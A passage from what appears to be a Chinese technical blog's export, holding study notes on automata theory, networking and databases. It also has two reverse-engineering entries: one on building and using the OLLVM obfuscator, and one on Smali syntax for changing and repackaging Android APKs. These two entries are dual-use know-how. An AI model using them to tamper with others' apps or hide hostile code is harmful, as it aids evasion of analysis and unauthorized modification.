M,该有限自动机的初态为该表的首行首列,终态为那些包含原终态的状态子集. 显然L(M') = L(M).DFA和NFA的等价性得证. DFA的化简 一个DFA M = (Σ, S, δ, s0, F)的化简是指寻找一个状态数比较少的DFA M′,使L(M) = L(M′). 可以证明,存在一个最少状态的DFA M′,使L(M) = L(M′). 等价状态:设s,t属于S,若对任何w属于Σ*,δ(s，w)属于F当且仅当δ(t，w)属于F,则称s和t是等价状态. 等价状态定义了状态集合上的等价关系,因此状态集合能被划分成等价类. 化简的基本思想:将M的状态集划分为一些不相交的子集,使得任何两个不同子集的状态是可区别的,而同一子集的任何两个状态是等价的.最后让每个子集选出一个代表,同时消去其他状态. 两个状态s和t等价应满足如下条件. 一致性条件,s和t必须同时或为终态或为非终态. 蔓延性条件,对于所有a属于Σ,δ(s, a) = r,δ(t, a) = q,r和q必须等价;相反,r和q不等价,则s和t不等价. 化简方法. 化简示例. 小结. 正规文法与有限自动机的等价性 对每个右线性正规文法GR或左线性正规文法GL,都存在一个有限自动机(FA)M,使得:L(M) = L(G). 对每一个FA M,都存在一个右线性正规文法GR和左线性正规文法GL,使得:L(M) = L(GR) = L(GL). 证明:右线性正规文法GR同有限自动机的等价性 设右线性正规文法GR = &lt;VT, VN, S, P&gt;.将VN中的每一非终结符号视为状态符号,并增加一个新的终结状态符号f,f不属于VN,构造有限自动机M = &lt;VN U {f}, VT, δ, S, {f}&gt;. 状态转换函数δ定义如下. 若对某个A属于VN且a属于VT U {ε},P中有产生式A → a,则令δ(A,a) = f. 对任意A属于VN且a属于VT U {ε},设P中左端为A,右端第一符号为a的所有产生式为:A → aA1|aA2|...|aAk(不包含A → a),则令δ(A,a) = {A1, A2, ..., AK}. 显然,由其状态转移函数可以看出该FA为NFA. 证明:左线性正规文法GL同有限自动机的等价性 设左线性正规文法GL = &lt;VT, VN, S, P&gt;.将VN中的每一非终结符号视为状态符号,并且增加一个初态符号q0,q0不属于VN,构造有限自动机M = &lt;VN U {q0}, VT, δ, q0, {S}&gt;. 状态转换函数δ定义如下. 若对某个A属于VN且a属于VT U {ε},P中有产生式A → a,则令δ(q0,a) = A. 对任意的A属于VN且a属于VT U {ε},若P中所有右端第一符号为A,第二符号为a的产生式为:A1 → Aa,A2 → Aa,...,Ak → Aa,则令δ(A,a) = {A1, A2, ..., Ak}. 证明:有限自动机同正规文法的等价性 设DFA M = &lt;S, Σ, δ, s0, F&gt;. 构造右线性正规文法 若s0不属于F,令GR = &lt;Σ, S, s0, P&gt;,其中P的产生式集合如下定义. 对任何a属于Σ及A,B属于S,若有δ(A,a) = B,当B不属于F时,令A → aB;当B属于F时,令A → a|aB. 对于w属于Σ*,不妨设w = a1a2...ak,其中ai属于Σ. 若s0能推导出w,则存在一个最左推导s0 ⇒ a1A1 ⇒ a1a2A2 ⇒ ... ⇒ a1a2...ak,即在M中有一条从s0出发依次经过A1,...,Ak - 1达到终态的通路,该通路上所有箭弧依次标记为a1,a2,...,ak. 反之亦然.所以w属于L(GR)当且仅当w属于L(M). 若s0属于F,因为δ(s0,ε) = s0,所以ε属于L(M),但ε不属于上面构造的GR产生的文法L(GR),L(GR) = L(M) - {ε}. 所以在上面的GR中添加新的非终结符号s0′(s0′不属于S)和产生式s0′ → s0|ε,并用s0′代替s0作开始符号.这样修正后的文法GR′仍然是右线性正规文法,并且L(GR′) = L(M). 构造左线性正规文法 将终态视为开始符号,P的定义如下. 对任何a属于Σ及A1,A2属于VN,有δ(A1,a) = A2,若A1是初态,A2 → a|A1a;若A1不是初态,A2 → A1a. 如果有多个终态,需要引入新终态,将原来的终态连接到新终态,箭符上的标记符为ε,将新的终态作为左线性正规文法的开始符号,其产生式为f′ → f1|f2|.... 正规式与FA的等价性 由NFA构造正规式r 首先对NFA M状态转换图进行改造,在M中加入两个结点X,Y. 从X用ε弧连接到M的所有初态结点;从M的所有终态结点用ε连接到Y,从而形成一个新的NFA,记为M′.它只有一个初态X和一个终态Y. 显然,L(M) = L(M′). 按下图消除M′中的所有结点,直至只剩X和Y. 最后,X到Y的弧上的标记的正规式即为所构造的正规式r.显然L(r) = L(M) = L(M′). 这就证明了:对于任何有限自动机M,都存在一个正规式r,使得L(r) = L(M). 由正规式r构造NFA 这证明了:对于任何正规式r,都存在一个有限自动机M,使得L(M) = L(r). 示例. 结论 由前面可知:正规文法,正规式,确定有限自动机和非确定有限自动机在接受语言的能力上是一致的. 词法分析器的自动产生--LEX]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>compiler-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-tool-OLLVM]]></title>
    <url>%2Fposts%2F37700b49%2F</url>
    <content type="text"><![CDATA[OLLVM OLLVM(Obfuscator-LLVM)旨在提供一套开源的针对LLVM的代码混淆工具,以增加对逆向工程的难度. OLLVM是基于LLVM实现的,LLVM是一个编译器框架,采用经典的三段式设计:前端可以使用不同的编译工具对代码文件做词法分析以形成抽象语法树AST,然后将分析好的代码转换成LLVM的中间表示IR;中间部分的优化器只对中间表示IR操作,通过一系列的Pass对IR做优化;后端负责将优化好的IR解释成对应平台的机器码. OLLVM的混淆操作就是在中间表示IR层,通过编写Pass来混淆IR.OLLVM适用LLVM支持的所有语言和目标平台. OLLVM默认支持-fla,-sub,-bcf三个混淆参数,可以单独使用,也可以配合使用.-fla参数表示使用控制流平展(Control Flow Flattening)模式,-sub参数表示使用指令替换(Instructions Substitution)模式,-bcf参数表示使用控制流伪造(Bogus Control Flow)模式. Instructions Substitution 指令替换是一种比较简单的混淆方式,OLLVM将一些简单的运算复杂化,但这种方式容易被代码优化给去除,目前OLLVM只实现对整数运算的混淆. control flow flattening control flow flattening通过多个case-swich结构将程序的控制流变成扁平形状,打破原有的逻辑结构,增加逆向的难度.OLLVM将源代码分割为几个基本块,并放在一个while循环结构中无限循环,程序的流程由一个变量控制. bogus control flow bogus control flow通过在源程序的控制流中添加一些基本块,这些基本块仅仅起了连接作用,并不影响实际的执行逻辑. Functions annotations OLLVM的Functions annotations模式支持对单个函数进行混淆. 12int func() __attribute((__annotate__(("bcf"))));//对函数func()使用bcf混淆 OLLVM的fla,sub和bcf三个属性可以搭配使用,只需要添加对应的编译选项即可. 下载并编译 123456789# git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.gitgit clone -b llvm-4.0 https://gitee.com/hitworld/obfuscator.gitmkdir buildcd build#cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../fuscator/make -j7cd ..build/bin/clang demo.c -o demo -mllvm -sub -mllvm -bcf -mllvm -fla]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Android-Smali-语法]]></title>
    <url>%2Fposts%2Fefad5586%2F</url>
    <content type="text"><![CDATA[Smali Android代码一般是用Java编写的,使用专门的Android虚拟机(5.0以下为Dalvik,5.0以上为ART)执行.Android虚拟机的可执行文件是dex文件.dex文件反编译之后就是Smali代码.Smali是Android虚拟机的反汇编语言. 通过修改Smali代码,再重新编译打包成新的APK来修改APK运行逻辑. 语法 Smali数据类型. Smali Java 备注 v void 只能用于返回值类型 Z boolean B byte S short C char I int J long F float D double Lpackage/name; 对象类型 L表示这是一个对象类型,package表示该对象所在的包,;表示对象名称的结束 [&lt;type&gt; 数组 [I表示一个int型数组 Smali关键词. 关键词 说明 .class 定义Java类名 .super 定义父类名 .source 定义Java源文件名 .filed 定义字段 .method 定义方法开始 .end method 定义方法结束 .annotation 定义注解开始 .end annotation 定义注解结束 .implements 定义接口指令 .local 指定了方法内局部变量的个数 .registers 指定方法内使用寄存器的总数 .prologue 表示方法中代码的开始处 .line 表示Java源文件中指定行 .paramter 指定了方法的参数 .param 和.paramter含义一致,但是表达格式不同 Java中变量都是存放在内存中的,Android为了提高性能,变量都是存放在寄存器中的,寄存器为32位,可以支持任何类型.寄存器分为:本地寄存器,用v开头数字结尾的符号来表示,例如v0;参数寄存器,用p开头数字结尾的符号来表示,例如p0. 在非static方法中,p0代指this,p1为方法的第一个参数.在static方法中，p0为方法的第一个参数. 赋值与获取 成员变量定义格式为:.field public/private [static][final] varName:&lt;type&gt;. 获取指令:iget,sget,iget-boolean,sget-boolean,iget-object,sget-object,aget. 赋值指令:iput,sput,iput-boolean,sput-boolean,iput-object,sput-object,aput. 123456789sget-object v0,Lcom/aaa;-&gt;ID:Ljava/lang/String;#获取ID这个String类型的成员变量并放到v0这个寄存器中.iget-object v0,p0,Lcom/aaa;-&gt;view:Lcom/aaa/view;#iget-object比sget-object多一个参数p0,这个参数代表变量所在类的实例,这里p0就是this..local v0, args:Landroid/os/Message;const/4 v1, 0x12iput v1,v0,Landroid/os/Message;-&gt;what:I#相当于java代码:args.what = 18;其中args为Message的实例. 函数 函数定义格式. 12.method public/private [static][final] methodName()&lt;type&gt;.end method 函数分为两类:direct method和virtual method,direct method就是private方法,virtual method就是指其余的方法. 123456789101112.method private ifRegistered()Z .locals 2 // 本地寄存器的个数 .prologue const/4 v0, 0x1 //v0赋值为1 if-eqz v0, :cond_0 //判断v0是否等于0,等于0则跳到cond_0执行 const/4 v1, 0x1 //符合条件分支 :goto_0 //标签 return v1 //返回v1的值 :cond_0 //标签 const/4 v1, 0x0 //cond_0分支 goto :goto_0 //跳到goto_0执行.end method 函数调用指令:invoke-direct,invoke-virtual,invoke-static,invoke-super,invoke-interface. 函数调用格式:invoke-**** {arg1, arg2, ...}, Lpackage/name;-&gt;funName(Lpackage/name;,...)Lpackage/name.如果不是是静态方法,arg1代表调用该方法的实例. 123const-string v0, "Eric"invoke-static &#123;v0&#125;, Lcmb/pbi;-&gt;t(Ljava/lang/String;)Ljava/lang/String;move-result-object v2 Smali需要用指令move-result或move-result-object来保存函数返回的结果.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-computer-network-基础]]></title>
    <url>%2Fposts%2Fc06ff4fd%2F</url>
    <content type="text"><![CDATA[互联网简介 三大类网络:电信网络,有线电视网络,计算机网络. 计算机网络主要是由一些通用的,可编程的硬件互连而成的,可编程的硬件能够用来传送多种不同类型的数据,并能支持广泛的和日益增长的应用. 从本质上看计算机网络由若干结点和连接这些结点的链路组成.通过路由器把网络互连起来,这就构成了一个覆盖范围更大的计算机网络,称之为互连网(internet). 因特网(Internet,互联网)是遵循TCP/IP协议族,利用路由器将各种计算机网络互连起来而形成的,一个覆盖全球的,特定的互连网,是世界上最大的计算机网络.互联网(因特网)具有两个重要基本特点:连通性与共享. 现在,任何机构和个人只要向某个互联网服务提供者ISP交纳规定的费用,就可从该ISP获取所需IP地址的使用权,并通过该ISP接入到互联网.根据提供服务的覆盖面积大小以及所拥有的IP地址数目的不同,ISP也分成为不同层次的ISP:主干ISP,地区ISP和本地ISP. 万维网是一个大规模的,联机式的信息储藏所.使用链接的方法,能非常方便地从互联网上的一个站点访问另一个站点,从而主动地按需获取丰富的信息. 互联网的标准化工作对互联网的发展起到了非常重要的作用:所有互联网标准都以RFC的形式在互联网上发表;成为互联网正式标准要经过三个阶段:互联网草案(有效期六个月);建议标准(成为RFC文档);互联网标准(达到正式标准后会分配到一个编号STD xxxx.一个标准可以和多个RFC文档关联).现在简化为二个阶段:建议标准,互联网标准. 除了建议标准和互联网标准这两种RFC文档外,还有三种RFC文档,即历史的,实验的和提供信息的RFC文档. 互联网的组成 互联网由边缘部分和核心部分组成. 边缘部分:由所有连接在互联网上的主机组成,用户直接用来通信和资源共享.这些主机又叫端系统. 核心部分:由大量网络和连接这些网络的路由器组成.这部分是为边缘部分提供服务的(提供连通性和交换). 端系统在功能上可能有很大的差别,所有具有可编程的硬件的系统都可以作为端系统. 边缘部分 端到端的通信:运行在主机A上的某个进程和运行在主机B上的另一个进程进行通信,简称主机间通信. 两类端系统之间的通信方式:Client/Server方式,简称为C/S方式;Peer-to-Peer方式,简称为P2P方式. C/S client和server都是指通信中所涉及的两个应用进程,C/S方式所描述的是进程之间服务和被服务的关系,客户是服务的请求方,服务器是服务的提供方. 客户端主动向远地服务器发起通信(请求服务),所以客户程序必须知道服务器程序的地址(在互联网中就是IP).服务器是一种专门用来提供某种服务的程序,被动等待并接受来自客户端的通信请求,需要同时处理多个远地或本地客户的请求,服务器事先不需要知道客户程序的地址. 客户与服务器的通信关系建立后,通信可以是双向的,客户端和服务器都可发送和接收数据. P2P 对等连接P2P是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方,只要两个主机都运行了对等连接软件就可以进行平等的,对等的连接通信. 对等连接方式从本质上看仍然是使用客户服务器方式,只是对等连接中的每一个主机既是客户又是服务器.例如:主机C请求D的服务的同时向F提供服务.对等连接工作方式可支持大量对等用户同时工作. 核心部分 网络核心部分最重要的功能就是交换,现在的交换技术有:电路交换,分组交换,报文交换等.互联网的核心部分采用了分组交换技术.路由器是实现分组交换的关键构件,其任务是存储并转发收到的分组. 电路交换 电路交换:每一部电话都直接连接到交换机上,而交换机使用交换(转接,使电话线连通起来)的方法,让电话用户彼此之间可以很方便地通信. 电路交换必定是面向连接的,电路交换分为三个阶段. 建立连接:建立一条专用的物理通路,以保证双方通话时所需的通信资源在通信时不会被其他用户占用. 通信:主叫和被叫双方能互相通电话. 释放连接:释放刚才使用的这条专用的物理通路和占用的所有通信资源. 从通信资源的分配角度来看,交换就是按照某种方式动态地分配通信资源.电路交换的用户在通信过程中始终占用整条链路的通信资源,计算机数据具有突发性,所以不适合独占. 分组交换 分组交换:采用存储转发技术,在发送端,先把较长的报文划分成较短的,固定长度的数据段,每一个数据段前面添加上首部(含有地址等控制信息)构成分组,依次把各分组发送出去;分组交换网以分组作为数据传输单元,收到分组的结点交换机根据收到的分组首部中的地址信息,把分组转发到下一个结点交换机,每个分组在互联网中独立地选择传输路径;接收端收到分组后剥去首部还原成报文. 主机为用户进行信息处理并向网络发送与接收分组.路由器对分组进行存储转发,最后把分组交付目的主机.在路由器(结点交换机)中的输入和输出端口之间没有直接连线,而是先把收到的分组放入缓存,查找转发表,找出到某个目的地址应从哪个端口转发,再把分组送到适当的端口转发出去. 分组交换的优点:传输过程中动态分配传输带宽,对通信链路逐段占用;分布式多路由的分组交换网,每个分组独立地选择最合适的转发路由;以分组作为传送单位;不需要建立连接; 分组交换的缺点:各结点存储转发时需要排队;分组首部造成了一定的内存开销. 报文交换 报文交换:以报文为数据交换的单位,报文携带有目标地址,源地址等信息,在交换结点采用存储转发的传输方式. 报文交换的主要特点是:存储接受到的报文,判断其目标地址以选择路由,最后,在下一跳路由空闲时,将数据转发给下一跳路由.实际上分组交换就是改良后的报文交换.报文交换系统现今都由分组交换或电路交换网络所承载. 对比 若要连续传送大量的数据,且其传送时间远大于连接建立时间,则电路交换的传输速率较快. 报文交换和分组交换不需要预先分配传输带宽,在传送突发数据时可提高整个网络的信道利用率. 由于一个分组的长度往往远小于整个报文的长度,因此分组交换比报文交换的时延小,同时也具有更好的灵活性. 多种计算机网络 按照网络的作用范围进行分类. 广域网WAN(Wide Area Network):作用范围通常为几十到几千公里. 城域网MAN(Metropolitan Area Network):作用距离约为5 ~ 50公里. 局域网LAN(Local Area Network):局限在较小的范围(如1公里左右). 个人区域网PAN(Personal Area Network):范围很小,大约在10米左右. 身域网:范围更小,只能覆盖到部分身体. 若中央处理机之间的距离非常近(如仅1米的数量级甚至更小些),则一般就称之为多处理机系统,而不称它为计算机网络. 按照网络的使用者进行分类. 公用网(public network):按规定交纳费用的人都可以使用的网络,因此也可称为公众网. 专用网(private network):为特殊业务工作的需要而建造的网络. 用来把用户接入到互联网的网络称为接入网AN(Access Network),它又称为本地接入网或居民接入网,接入网是一类比较特殊的计算机网络. 接入网本身既不属于互联网的核心部分,也不属于互联网的边缘部分.接入网是从某个用户端系统到互联网中的第一个路由器(也称为边缘路由器)之间的一种网络.从覆盖的范围看,很多接入网还是属于局域网.从作用上看,接入网只是起到让用户能够与互联网连接的桥梁作用. 按照网络的拓扑结构划分:总线型结构.环形结构.星形结构.树形结构.网状结构.混合型结构. 计算机网络的性能指标 计算机网络的性能一般是指:速率,带宽,吞吐率,时延,时延带宽积,往返时间RTT,利用率. 一些非性能特征也很重要:费用,质量,标准化,可靠性,可扩展性和可升级性,可管理性和可维护性. 速率 速率指的是数据的传送速率,也称为数据率或比特率.速率的标准单位是bit/s.速率往往是指额定速率或标称速率,非实际运行速率. 带宽 带宽本来是指信号具有的频带宽度,其标准单位是赫.在计算机网络中,带宽用来表示网络中某信道传送数据的能力,表示在单位时间内网络中的某信道所能通过的最高数据率. 在带宽的上述两种表述中,前者为频域称谓,而后者为时域称谓,其本质是相同的.一条通信链路的带宽越宽,其所能传输的最高数据率也越高.在时间轴上信号的宽度随带宽的增大而变窄. 吞吐量 吞吐量表示在单位时间内通过某个网络(信道,接口)的数据量,用于衡量网络在单位时间内无差错地传输数据的能力.吞吐量受网络的带宽或网络的额定速率的限制. 时延 时延是指数据从网络(或链路)的一端传送到另一端所需的时间,有时也称为延迟或迟延. 网络中的时延由几个不同的部分组成:发送时延,传播时延,处理时延,排队时延.在总时延中,究竟是哪一种时延占主导地位,必须具体分析. 发送时延(传输时延):从发送数据帧的第一个比特算起,到该帧的最后一个比特发送完毕所需的时间.其值为数据帧长度除以发送速率. 传播时延:电磁波在信道中需要传播一定的距离而花费的时间.其值为信道长度除以信号在信道上的传播速率. 处理时延:主机或路由器在收到分组时,为处理分组所花费的时间.在该过程由于队列已满会导致丢包重发与网络阻塞. 排队时延:分组在路由器输入输出队列中排队等待处理.排队时延的长短往往取决于网络中当时的通信量. 高速网络链路提高的仅仅是数据的发送速率而不是比特在链路上的传播速率,即减小了数据的发送时延.宽带链路和窄带链路上比特的传播速率是一样的. 时延的计算 分组交换的时延:源发送时延(主机,发送的是整个报文,包括首部),传播时延,中间发送时延(路由器,发送的是单个分组),中间结点的处理时延和排队时延,接收主机的处理时延. 电路交换的时延:源发送时延(主机,发送的是整个报文),传播时延,建立连接时延,接收主机的处理时延. 时延带宽积 时延带宽积又称为以比特为单位的链路长度,其值为传播时延乘带宽.只有在代表链路的管道都充满比特时,链路才得到了充分利用. 往返时间 往返时间:从发送方发送数据开始,到发送方收到来自接收方的确认,总共经历的时间.当使用卫星通信时,往返时间RTT相对较长,是很重要的一个性能指标. 利用率 信道利用率:某信道有百分之几的时间是被利用的(有数据通过).完全空闲的信道的利用率是零.网络利用率是全网络的信道利用率的加权平均值. 根据排队论的理论,当某信道的利用率增大时,该信道引起的(排队)时延也就迅速增加.若令D0表示网络空闲时的时延,D表示网络当前的时延,U是网络的利用率,则在适当的假定条件下,D和D0之间的关系:D = D0 / (1 - U). 计算机网络的体系结构 计算机网络的体系结构:计算机网络的各层及其协议的集合,就是计算机网络及其部件所应完成的功能的精确定义.实现:遵循体系结构的前提下用何种硬件或软件完成这些功能的问题.体系结构是抽象的,而实现则是具体的,是真正在运行的计算机硬件和软件. ISO提出了一个试图使各种计算机在世界范围内互连成网的标准框架,即著名的开放系统互连基本参考模型OSI/RM,简称为OSI.遵循OSI标准的系统可以和遵循这一标准的其他任何系统进行通信.OSI并没有得到市场的认可,非国际标准TCP/IP获得了最广泛的应用.TCP/IP常被称为事实上的国际标准. 计算机网络需要完成的主要功能. 差错控制:使相应层次对等方的通信更加可靠. 流量控制:发送端的发送速率必须使接收端来得及接收,不要太快. 分段和重装:发送端将要发送的数据块划分为更小的单位,在接收端将其还原. 复用和分用:发送端几个高层会话复用一条低层的连接,在接收端再进行分用. 连接建立和释放:交换数据前先建立一条逻辑连接,数据传送结束后释放连接. 协议与划分层次 网络体系结构解决异质性问题采用的是层次结构方法,将复杂的网络互联问题划分为若干个较小的,单一的问题,在不同层上予以解决.层次结构方法包括三个内容:分层及每层功能,服务与层间接口,还有对应的协议. 通信虚电路:通信是在同层之间进行,第N层只能与对方的第N层通信. 通信实电路:每一层将数据和控制信息传送给下一层,直至最底层,通过物理介质进行实际的传输. 多层通信的实质:对等层实体之间虚拟通信,下层向上层提供服务,实际通信在最底层完成.协议是横向的,而服务是纵向的. 分层好处:各层之间是独立的;灵活性好;结构上可分割开;易于实现和维护;能促进标准化工作.分层缺点:降低效率;有些功能会在不同的层次中重复出现,因而产生了额外开销. 计算机网络中的数据交换必须遵守事先约定好的规则(网络协议),这些规则明确规定了所交换的数据的格式以及有关的同步问题(时序). 网络协议的三要素. 语法:数据与控制信息的结构或格式. 语义:需要发出何种控制信息,完成何种动作以及做出何种响应. 同步(或时序):事件实现顺序的详细说明. 协议的两种形式:一种是使用便于人来阅读和理解的文字描述;另一种是使用让计算机能够理解的程序代码. OSI七层协议 OSI物理层规定了介质与插接件的规格,信号的制式,收发与转发设备的性能,插接件各针的功能定义以及建立连接,传送位流和拆除连接的操作规程.规定了在物理媒体上传输的数据单位,比特流;规定了传输媒体之间的机械,电气,功能和规程的特性.为数据链路层提供服务. OSI数据链路层依靠组建数据帧,实现帧同步,按帧进行检错,重发出错帧,根据需要进行流量和顺序控制等来保证相邻结点之间有可靠的数据传输,从而达到无差错地传输帧.传输的数据单位,帧.提供面向连接的链路管理.为网络层提供服务. 数据帧在数据链路上传输的几种情况. OSI网络层处理如何将分组从源传送到目的地.数据传输单位,分组.提供路由选择算法.提供流量控制.通过子网划分防止广播.控制网络互连. 虚电路和数据报是面向连接和无连接服务在网络层的具体实现. 虚电路服务:在传送数据之前,首先通过虚呼叫建立一条虚电路;所有分组沿同一条路径传送,并且按发出顺序到达,类似电路交换;建立连接后,分组中只需携带连接标识;建立连接时可协商参数,开销等. 数据报服务:每个分组单独传送;网络为每个分组单独选路,路径可能不同;分组到达顺序可能与发出顺序不同;分组中需要携带完整的目的地址. 以上三层被称为通信子网,即用于信号的传输.以下四层被称为资源子网,即用于主机对信号的处理. OSI传输层一方面弥补网络层的不足,另一方面对高层屏蔽子网的不一致性;传输层的目的是提供有效,可靠且价格合理的端对端的通信服务,从端到端(主机到主机)经网络透明地传输报文,但不知道通信子网.传输的数据单位,报文.提供面向连接的服务和无连接的服务.提供流量控制和差错控制. OSI会话层负责不同主机的不同进程间的通信.提供会话同步,为通信的应用进程建立与组织会话,使应用进程能管理与控制通信进程. OSI表示层为通信双方的应用层实体提供共同的表达手段,使双方能正确地理解所传送的信息.实际上表示层的功能涉及到格式转换,数据加密与数据压缩等诸多方面数据格式的转换. OSI应用层规定应用应该遵循的规则,也是最终用户的接口. OSI七层协议小结:应用层相当于做什么.表示层相当于看起来像什么.会话层相当于轮到谁讲话,从何处讲.传输层相当于对方在何处.网络层相当于走那条路可到达对方.数据链路层相当于每一步该怎么走.物理层就是在物理媒体上透明地传输比特流. 数据传输模型 OSI参考模型把对等层次之间传送的数据单位称为该层的协议数据单元PDU,现已被许多非OSI标准采用.物理层PDU指数据位.数据链路层PDU指数据帧.网络层PDU指数据包.传输层PDU指数据段.会话层或以上为数据.在特定的上下文情况下,特定层的PDU有时可以代表这个层. 任何两个同样的层次把数据(即数据单元加上控制信息)通过水平虚线直接传递给对方,这就是所谓的对等层之间的通信. 主机1向主机2发送数据. TCP/IP参考模型 数据链路层:采用现成的局域网协议.802.3以太网协议,802.4令牌网协议,802.5令牌环协议,PPP点到点协议. 网络层:四个协议.IP,ICMP,ARP,RARP. 传输层:TCP,可靠,面向连接,有序,字节流;UDP,不一定可靠,无连接,无序,数据报. 应用层:SMTP,DNS,FTP,HTTP,telnet. TCP/IP模型缺点:概念模糊,不通用,不适合描述其他任何协议栈,主机至网络层不是常规意义上层的概念,而是接口,没有区分物理层和数据链路层. TCP/IP与OSI的对比. 相似处:都采用分层结构,基于一组相关的协议,功能上基本相当;都有提供可靠的端到端传输服务的传输层,并作为面向应用功能和面向传输功能的分界线. 不同处:OSI中,服务,协议,接口三者独立,与现代的面向对象方法非常吻合,协议改动不会互相影响.服务告诉上层能做什么,接口告诉上层怎样访问服务,协议解决对等层交互.TCP/IP没有清晰的服务定义,协议间引用直接通过报文,协议不具有透明性. OSI/RM的制定先于协议.好处,更为通用;问题,非最优化,直接影响是效率低.TCP/IP先有协议,后有参考模型.优化,效率高,但影响通用性. 实体,协议,服务和服务访问点 实体表示任何可发送或接收信息的硬件或软件进程.协议是控制两个对等实体进行通信的规则的集合.在协议的控制下,两个对等实体间的通信使得本层能够向上一层提供服务.要实现本层协议,还需要使用下层所提供的服务.协议的实现保证了能够向上一层提供服务.本层的服务用户只能看见服务而无法看见下面的协议,即下面的协议对上面的服务用户是透明的. 协议是水平的,即协议是控制对等实体之间通信的规则.服务是垂直的,即服务是由下层向上层通过层间接口提供的.上层使用服务原语获得下层所提供的服务. 同一系统相邻两层的实体进行交互的地方,称为服务访问点SAP.SAP实际上就是一个逻辑接口.OSI把层与层之间交换的数据的单位称为服务数据单元SDU.SDU可以与PDU不一样.例如:可以是多个SDU合成为一个PDU,也可以是一个SDU划分为几个PDU. TCP/IP的体系结构 实际上,现在的互联网使用的TCP/IP体系结构有时已经发生了演变,即某些应用程序可以直接使用IP层,或甚至直接使用最下面的网络接口层.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-database-principles-基础]]></title>
    <url>%2Fposts%2F751e9173%2F</url>
    <content type="text"><![CDATA[基本概念 数据是数据库中存储的基本对象,是描述事物的符号记录.所有信息都是数据,不论复杂还是简单,例如:文本,图形,图像,音频,视频等.数据与其语义(含义)是不可分的.93是一个数据,它可以是某人的成绩,体重或者一个学校的人数等等. 数据库是长期储存在计算机内,有组织的,可共享的大量数据的集合.在数据库中数据按一定的数据模型组织,描述和储存;为各种用户共享;由DBMS统一管理和控制;整体数据的结构化;数据独立性较高且易扩展. 数据库管理系统(DBMS)是位于用户与操作系统之间的一层数据管理软件,用于科学地组织和存储数据,高效地获取和维护数据. 数据库管理系统功能. 数据定义功能(提供数据定义语言定义数据库中的数据对象). 数据组织,存储和管理功能.分类组织,存储和管理各种数据;确定组织数据的文件结构和存取方式;实现数据之间的联系;提供多种存取方法提高存取效率 数据操纵功能(提供数据操纵语言实现对数据库的基本操作,CURD). 数据库的事务管理和运行管理,数据库在建立,运行和维护时由DBMS统一管理和控制,保证数据的安全性,完整性,多用户对数据的并发使用和发生故障后的系统恢复. 数据库的建立和维护功能(数据库初始数据装载转换,数据库转储,介质故障恢复,数据库的重组织,性能监视分析等). DBMS与网络中其它软件系统的通信,两个DBMS系统的数据转换,异构数据库之间的互访和互操作. 数据库系统是在计算机系统中引入数据库后的系统构成,其包括:数据库,操作系统,数据库管理系统及其开发工具,应用系统,数据库管理员,用户. 数据管理技术 数据管理技术是对数据进行分类,组织,编码,存储,检索和维护.是数据处理的中心问题.发展过程:人工管理阶段,文件系统阶段,数据库系统阶段. 数据库系统的特点:数据结构化,数据的共享性高,冗余度低,易扩充,数据独立性高,数据由DBMS统一管理和控制. 整体数据的结构化是数据库的主要特征之一,不仅数据内部结构化,整体也是结构化的,数据之间具有联系.数据的结构用数据模型描述,无需程序定义和解释,数据可以变长,数据的最小存取单位是数据项. 数据库系统从整体角度看待和描述数据,数据面向整个系统,可以被多个用户,多个应用共享使用. 数据库系统中的数据独立性体现在两个方面:物理独立性,指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的;逻辑独立性,指用户的应用程序与数据库的逻辑结构是相互独立的.数据独立性是由DBMS的二级映像功能来保证的. 数据由DBMS统一管理和控制,DBMS提供的数据控制功能:数据的安全性保护,数据的完整性检查,并发控制,数据库恢复. 数据模型 两大类数据模型 数据库中用数据模型这个工具来抽象,表示和处理现实世界中的数据和信息. 数据模型分为两类:概念模型,也称信息模型,是按用户的观点来对数据和信息建模,用于数据库设计;逻辑模型和物理模型,逻辑模型主要包括网状模型,层次模型,关系模型,面向对象模型等,按计算机系统的观点对数据建模,用于DBMS实现.物理模型是对数据最底层的抽象,描述数据在系统内部的表示方式和存取方法,和磁盘或磁带上的存储方式和存取方法. 客观对象的抽象过程,两步抽象,现实世界中的客观对象抽象为概念模型,把概念模型转换为某一DBMS支持的数据模型/逻辑模型.逻辑模型到物理模型由DBMS完成. 数据模型的组成要素 数据模型的组成要素:数据结构,数据操作,完整性约束条件. 数据结构是描述数据库的组成对象,以及对象之间的联系.包括与数据类型,内容,性质有关的对象,与数据之间联系有关的对象.数据结构是对系统静态特性的描述. 数据操作是对数据库中各种对象(型)的实例(值)允许执行的操作及有关的操作规则.操作包括查询,更新(包括插入,删除,修改),即CURD.数据模型对操作的定义包括:操作的确切含义,操作符号,操作规则,实现操作的语言.数据操作是对系统动态特性的描述. 数据的完整性约束条件是一组完整性规则的集合,完整性规则是给定的数据模型中数据及其联系所具有的制约和储存规则,用以限定符合数据模型的数据库状态以及状态的变化,以保证数据的正确,有效,相容. 数据模型对完整性约束条件的定义:反映和规定本数据模型必须遵守的基本的通用的完整性约束条件.例如在关系模型中,任何关系必须满足实体完整性和参照完整性两个条件.提供定义完整性约束条件的机制,以反映具体应用所涉及的数据必须遵守的特定的语义约束条件. 概念模型 概念模型用于信息世界的建模,是现实世界到机器世界的一个中间层次,数据库设计人员和用户之间进行交流的语言.对概念模型的基本要求:较强的语义表达能力,能够方便,直接地表达应用中的各种语义知识,简单,清晰,易于用户理解. 信息世界中的基本概念 实体Entity:客观存在并可相互区别的事物称为实体,可以是具体的人,事,物或抽象的概念. 属性Attribute:实体所具有的某一特性称为属性,一个实体可以由若干个属性来刻画. 码Key:唯一标识实体的属性集称为码. 域Domain:属性的取值范围称为该属性的域. 实体型Entity 